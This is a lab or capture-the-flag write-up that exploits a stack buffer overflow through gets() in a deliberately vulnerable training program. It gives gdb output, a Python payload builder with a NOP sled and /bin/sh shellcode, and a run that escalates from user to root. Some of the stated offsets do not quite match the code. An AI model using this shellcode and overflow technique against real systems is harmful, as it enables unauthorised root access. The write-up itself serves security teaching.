# Stack 5

## Problem

We call gdb to list the functions that are in the program and we find that there
is only one function this time.

```gdb
info function
>>>File stack5/stack5.c:
>>>int main(int, char **);
```

We try to disassemble the main function to figure out what we are trying to exploit.

```gdb
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   ebp
0x080483c5 <main+1>:    mov    ebp,esp
0x080483c7 <main+3>:    and    esp,0xfffffff0
0x080483ca <main+6>:    sub    esp,0x50
0x080483cd <main+9>:    lea    eax,[esp+0x10]
0x080483d1 <main+13>:   mov    DWORD PTR [esp],eax
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave
0x080483da <main+22>:   ret
End of assembler dump.
```

There only seems to be a function call `gets` which we can try to maneuver with.

## Idea and Attack process

We plan to inject code through the `gets` call by overflowing the stack such
that we can inject some form of code that we want to run.

There are 72bytes to replace from top of stack to ebp. We also have to replace
4 more bytes to remove the ebp of the previous caller then we can inject the
address of the shellcode which is 8 bytes after the current ebp. Recall that the
block below the ebp is the previous ebp (from push ebp) followed by the return
address and following that address will be our shellcode.

```gbd
b*0x080483d1
run
info reg ebp esp
ebp            0xbffffcb8       0xbffffcb8
esp            0xbffffc60       0xbffffc60
```

We first figure out what is the ebp and esp that we should manipulate with.
From the output, we can guess the size of the buffer and we can be sure that the
size of the buffer is still 64bytes, and the 76bytes planned initially is valid.

We construct a python file to conjure up the needed values to run our code.

```python
import struct
filler = "1" * 76
addr = struct.pack("I", 0xbffffcc4+64)
nop = "\x90"*128
code =  "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

print filler+addr+nop+code
```

We position our address 50bytes after the ebp such that the address will fall
within the nop instructions that is injected. When the CPU runs the nop, it will
keep executing till it reaches the shell code that we plan to inject. The shell
code was obtained online.

```bash
whoami
>>>user
vim stack5_py.py
python stack5_py.py > /tmp/payload
./stack5 < /tmp/payload
whoami
>>>root
```

Running the script, we get the shellcode to run and when we prompt `whoami` now,
it returns root instead of user.

## Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
